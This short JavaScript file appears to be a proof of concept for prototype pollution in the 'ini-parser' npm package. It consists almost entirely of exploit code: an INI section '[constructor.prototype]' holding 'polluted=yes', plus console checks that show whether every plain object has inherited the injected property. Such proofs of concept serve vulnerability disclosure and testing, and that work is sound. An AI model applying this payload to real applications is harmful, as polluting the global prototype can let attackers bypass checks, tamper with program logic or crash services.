var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
let a = require('ini-parser');
a.parse('[constructor.prototype]\npolluted=yes');
console.log({}.polluted);